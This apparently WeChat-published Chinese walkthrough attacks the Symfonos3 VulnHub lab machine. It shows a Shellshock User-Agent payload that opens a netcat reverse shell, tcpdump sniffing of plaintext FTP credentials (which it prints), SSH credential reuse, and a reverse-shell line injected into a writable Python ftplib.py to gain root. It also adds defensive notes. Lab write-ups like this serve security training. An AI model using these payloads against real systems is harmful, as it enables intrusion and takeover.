---
title: Shellshock CGI 注入与 ftplib.py 组权限提权：Symfonos3 靶机实战
url: https://mp.weixin.qq.com/s/7qdfoonhuuUc9bcWGuHqxA
source: Doonsec's feed
date: 2026-09-21
fetch_date: 2026-09-22T07:01:41.508554
---

# Shellshock CGI 注入与 ftplib.py 组权限提权：Symfonos3 靶机实战

# Shellshock CGI 注入与 ftplib.py 组权限提权：Symfonos3 靶机实战

Hash-Sec
Hash-Sec

Hash-Sec

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

DAILY NOTE · 生活手帐

Symfonos3 靶机渗透记录

Symfonos3 是 VulnHub 平台上的中等难度 Linux 靶机，目标 IP 192.168.68.171。该靶机完整演示了一条从 Web 层远程代码执行到本地权限提升的攻击链：目录枚举发现 CGI 脚本 → Shellshock（CVE-2014-6271）环境变量注入获取初始 foothold → pspy 进程监控发现 root 定时任务 → tcpdump 嗅探回环流量获取 FTP 明文凭据 → SSH 横向移动 → 篡改 Python 标准库文件实现持久化提权。

生活 · 书影 · 食光

慢慢来，比较快

01

1. 主机发现与端口扫描

通过 ARP 扫描确认目标主机存活，IP 地址为 192.168.68.171。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NCAoibNiaTbqm3ibb7JzmJ1wBwQicwzOL4OtUnmRX8ib4pvH2GvHBTG7ZibJ2SAIgnqnEXElYYznWtmfgib3ia8uhKwGyNKK1C1mzn8MPG09jHSdy0k/640?wx_fmt=png&from=appmsg)

访问 80 端口，主页为静态 HTML 页面，未发现明显功能点。右键查看页面源代码，发现一行 HTML 注释：

bash

1<!-- Can you bust the underworld? -->

该注释语义为"你能否摧毁 underworld"，其中 underworld 一词高度可疑，极有可能是一个隐藏目录或路径线索，记入信息收集清单。

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqlvibbUDoqibqlzKicDfhxNRXqAUIWBUiaqaiaCUGMTCdoztlFkIGiap2H05BvqG3VmJxYTJPhc2DDqQQsCw0eOhjQTmGsr7qLgcuHpc/640?wx_fmt=png&from=appmsg)

执行全端口 TCP SYN 扫描与服务指纹识别：

bash

1nmap -p- -A -T4 192.168.68.171

2

3PORT   STATE SERVICE VERSION

421/tcp open  ftp     ProFTPD 1.3.5b

522/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6

680/tcp open  http    Apache httpd 2.4.25 ((Debian))

开放端口对应服务：21/tcp 为 ProFTPD 1.3.5b，22/tcp 为 OpenSSH 7.4p1，80/tcp 为 Apache 2.4.25。FTP 与 SSH 暂未发现可直接利用的已知 CVE 或弱口令，攻击面优先从 80/tcp 的 Web 服务展开。

02

2. 目录枚举与 CGI 攻击面定位

对 Web 根目录执行字典枚举：

bash

1dirb http://192.168.68.171/

dirb 扫描结果：

01

/cgi-bin/ — HTTP 403，目录存在但禁止直接列表

02

/gate/ — HTTP 200，可访问

03

/server-status — HTTP 403

/cgi-bin/ 目录返回 403 而非 404，说明目录存在。CGI（Common Gateway Interface）是 Shellshock 漏洞的经典攻击面——CGI 脚本通过环境变量与 Web 服务器通信，且通常由 Bash 解释器执行，完美满足 Shellshock 的三个利用条件。

使用 gobuster 对 /cgi-bin 路径做深度递归扫描：

bash

1gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://192.168.68.171/cgi-bin

扫描发现 /cgi-bin/underworld，HTTP 状态码 200——与页面源代码注释中的 "underworld" 完全吻合。

直接访问该 URL，响应体为 uptime 命令的标准输出：

bash

103:40:24 up 1:05, 0 users, load average: 0.00, 0.02, 0.00

这表明该 CGI 脚本在服务端执行了系统命令并将 stdout 直接返回给客户端。这种"用户可控输入 → Bash 解释器 → 命令执行结果回显"的架构，就是 Shellshock 漏洞的理想攻击场景。

03

3. Shellshock（CVE-2014-6271）漏洞原理与利用

漏洞原理

Shellshock 是 GNU Bash 4.3 及之前版本中的一个环境变量注入漏洞。Bash 在解析环境变量中的函数定义时，会将形如 () { ... } 的变量识别为函数定义。但问题在于：Bash 在执行完函数体后，会继续执行函数定义花号之后的任意命令，且这一行为没有任何授权校验。

正常的环境变量函数定义：

bash

1foo=() { echo "hello"; }

攻击者构造的恶意环境变量：

bash

1foo=() { :; }; /bin/bash -c 'id'

Bash 解析时，{ :; } 是一个空函数体（冒号是空操作符），函数定义结束后紧跟的 ; /bin/bash -c 'id' 会被当作额外的命令直接执行。

为什么 CGI 是理想攻击面

Apache 在执行 CGI 脚本时，会将 HTTP 请求头中的字段自动映射为环境变量（如 User-Agent → HTTP\_USER\_AGENT，Cookie → HTTP\_COOKIE）。这些环境变量由攻击者完全可控，且 CGI 脚本通常通过 Bash 解释器执行——三个条件全部满足：

1. 环境变量自动传递：Apache 自动将 HTTP 请求头注入 CGI 进程的环境变量 2. 攻击者可控：任意 HTTP 头字段值均可由攻击者构造 3. Bash 解释器启动：CGI shebang 通常为 #!/bin/bash 或 #!/bin/sh（指向 Bash）

利用过程

将恶意 payload 注入 HTTP 请求头（此处以 User-Agent 为例），触发反弹 shell：

bash

1() { :; }; echo; echo; /bin/bash -c 'nc 192.168.68.156 4444 -e /bin/bash'

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqkXud9iaXIrficyyJmtF3Jpxhl1MM7Lm1PXUCAm1jL5UocTdxxVWsQnYXia78TJ1MJpvd8bjugxQomwIdic3QXwN5hqExibud4qkZBk/640?wx_fmt=png&from=appmsg)

Kali 监听端口收到来自目标的反弹连接，获得 www-data 权限的交互式 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqnQlomtBDuZafDXH0aIEvVZiaDZYepQCw6YzBEsWpqibzVGiawnKUFnpJ5RtWibXYo885OyB0fT7MGJmMTCibdSbSSVQPo2GF2sThPU/640?wx_fmt=png&from=appmsg)

防御面：Shellshock 虽为 2014 年披露的漏洞，但在嵌入式设备、老旧发行版和未及时打补丁的服务器中仍广泛存在。修复方式为升级 Bash 至 4.3 及以上版本，或对 CGI 进程的环境变量做严格白名单过滤。

04

4. 本地权限侦察：pspy 进程监控

获得 www-data 低权限 shell 后，提权侦察的第一步是枚举目标系统上运行的所有进程及其执行用户。传统 ps aux 命令在无 root 权限时无法看到完整进程信息，pspy 工具通过读取 /proc 文件系统，无需 root 权限即可监控所有进程的启动事件、执行命令行和所属 UID。

将 pspy64 二进制上传至 /tmp 目录并执行：

bash

1wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

2chmod +x pspy64

3./pspy64

运行数分钟后，捕获到一条高价值进程记录：

bash

12026/09/21 05:26:01 CMD: UID=0    PID=9112   | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py

UID=0 表示该进程以 root 权限运行，执行的是 /opt/ftpclient/ftpclient.py——一个 Python 2.7 编写的 FTP 客户端脚本。结合后续分析，该脚本通过系统 cron 定时任务周期性执行，以 FTP 协议连接远程服务器并执行文件同步操作。

05

5. 回环流量嗅探：tcpdump 捕获 FTP 明文凭据

FTP 协议的控制通道默认使用 TCP 21 端口，且用户名（USER）和密码（PASS）以明文形式传输。既然 root 进程周期性地以 FTP 客户端身份连接服务器，那么在本地回环接口（lo）上抓包就能直接获取明文凭据。

在目标主机上执行 tcpdump 嗅探回环流量：

bash

1tcpdump -i lo

等待下一次 cron 触发，捕获到以下 FTP 控制会话：

bash

105:44:01.763790 IP localhost.43132 > localhost.ftp: FTP: USER hades

205:44:01.764203 IP localhost.ftp > localhost.43132: FTP: 331 Password required for hades

305:44:01.764284 IP localhost.43132 > localhost.ftp: FTP: PASS PTpZTfU4vxgzvRBE

提取到 FTP 认证凭据：用户名 hades，密码 PTpZTfU4vxgzvRBE。

基于运维人员常见的密码复用习惯，该凭据极有可能同时用于 SSH 登录：

bash

1ssh hades@192.168.68.171

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqnntiaxhWKqIHlm3sIfOV9tibd9REBFlfxibbrcf5ZcyTAibyp91oyEb2tlnYyocGBicvnMQJJT5Kyp1prMibBOayeH7LsAEuAHxMJ90/640?wx_fmt=png&from=appmsg)

SSH 认证成功，获得 hades 用户的交互式登录 shell。

提权侦察方法论：获取低权限 shell 后，盲目枚举 SUID 二进制或内核漏洞效率极低。正确路径是：先跑 ss -tuln 看本地监听端口 → 跑 pspy 看定时任务和后台进程 → 跑 sudo -l 看 sudo 权限 → 从配置文件和定时任务中提取硬编码凭据。信息收集永远是提权的第一优先级。

06

6. Python 标准库文件篡改提权

SSH 登录后，首先确认当前用户的组归属和目标文件权限：

bash

1ls -al /usr/lib/python2.7/ftplib.py

2-rwxrw-r-- 1 root gods 37755 Sep 26  2018 ftplib.py

3

4id

5uid=1000(hades) gid=1000(hades) groups=1000(hades),1002(gods)

文件权限分析：

01

文件所有者：root（读/写/执行）

02

所属组：gods（读/写）

03

其他用户：只读

hades 用户属于 gods 组，而 ftplib.py 对 gods 组开放了写权限——攻击者可直接修改该文件内容。

ftplib.py 是 Python 2.7 标准库中的 FTP 客户端模块。root 定时任务执行的 ftpclient.py 必然通过 import ftplib 或 from ftplib import ... 引入该模块。Python 的导入机制会在模块首次加载时从头执行整个文件内容，因此只要在 ftplib.py 文件头部插入恶意代码，当 root 进程下次触发 cron 任务时，恶意代码就会以 root 权限执行。

在 ftplib.py 文件头部插入反弹 shell 代码：

python

1import os

2os.system("nc -e /bin/bash 192.168.68.156 1111")

保存退出后，Kali 端开启监听，等待下一次 cron 周期触发。反弹 shell 连接建立后，确认 UID：

bash

1uid=0(root) gid=0(root) groups=0(root)

成功获取 root 权限。

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqnvNFhgUeL0zaVsrLFiax0icLDt83sYgQzCOepSF68Wrd3gNZichv9ZyRhBM0y8Zpibw7SFBKibib5S1zLDbEx5JB0tUGoKOLpsAickibw/640?wx_fmt=png&from=appmsg)

防御面：系统级 Python 标准库文件（如 /usr/lib/python2.7/ 下的模块）应严格设置权限为 root:root 644，任何普通用户或组不应拥有写权限。此外，cron 定时任务执行的脚本中硬编码明文密码，本质上是将敏感凭据暴露在文件系统中，应改用环境变量或加密凭据管理方案。

07

7. 完整攻击链路

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqm0fHiaGbEZL24P1Zk5ylVRnd4xP1aVQJ92z9t50LTGhgryPX0mqpX3vkEc98ZEibmBporDLicse3RwMaAQtJSiaAsPdJRTVPjiapes/640?wx_fmt=png&from=appmsg)

| 攻击阶段 | 技术手段 | 关键输出 |
| --- | --- | --- |
| 信息收集 | ARP 扫描 + nmap 全端口 + dirb/gobuster 目录枚举 | 发现 /cgi-bin/underworld CGI 脚本 |
| 初始 foothold | Shellshock（CVE-2014-6271）环境变量注入 | 获取 www-data 权限反弹 shell |
| 提权侦察 | pspy 进程监控 + tcpdump 回环嗅探 | 发现 root cron 任务，捕获 hades FTP/SSH 凭据 |
| 横向移动 | SSH 密码复用登录 | 获得 hades 用户交互式 shell |
| 权限提升 | ftplib.py 组权限可写，篡改 Python 标准库 | 等待 root cron 触发，获取 root 反弹 shell |

该靶机的核心设计思路：初始 foothold 依赖经典 Web 漏洞（Shellshock），而提权路径完全依赖系统监控与信息收集——不依赖内核漏洞、不依赖 sudo 配置错误、不依赖 SUID 二进制滥用。攻击者需要主动发现 root 定时任务、嗅探明文协议流量、识别可写的共享库文件，每一步都是对攻击者侦察能力的考验。

08

关联知识点

01

Shellshock（CVE-2014-6271）：GNU Bash 环境变量注入漏洞。Bash 在解析以函数定义形式（() { ... }）存储的环境变量时，会执行函数定义结束后附加的任意命令。CGI 脚本因自动将 HTTP 请求头映射为环境变量，成为该漏洞的主要攻击面。

02

pspy：用户态进程监控工具，通过读取 /proc/[pid]/cmdline 和 /proc/[pid]/status 实现无 root 权限的进程枚举，可捕获 cron 任务、后台守护进程和定时脚本的执行痕迹。

03

FTP 明文嗅探：FTP 协议控制通道（TCP 21）以明文传输 AUTH 命令（USER/PASS），在同一广播域或回环接口上可直接通过 tcpdump 提取凭据。

04

Python 库文件劫持提权：当高权限进程 import 的 Python 模块文件对低权限用户可写时，可在模块顶部插入任意代码，高权限进程加载该模块时即触发代码执行。属于"库文件劫持"（Library Hijacking）提权技术的一种。

写在最后

看到这儿，说明你把它读完了。这类文章能走多远，只取决于两件事：你的在看和转发。

顺手关注并设为星标，下一篇更新第一时间见。

PEACH END

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqmCevcGNLYVvhsHhqR0baOvibFSaDSeNu3wc0Nd8llBoibvqpnSdK5bVpW4Zo2MMqmM7wGRwSaOgvFq6xhgKfDvsUo6Rw1fLztng/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过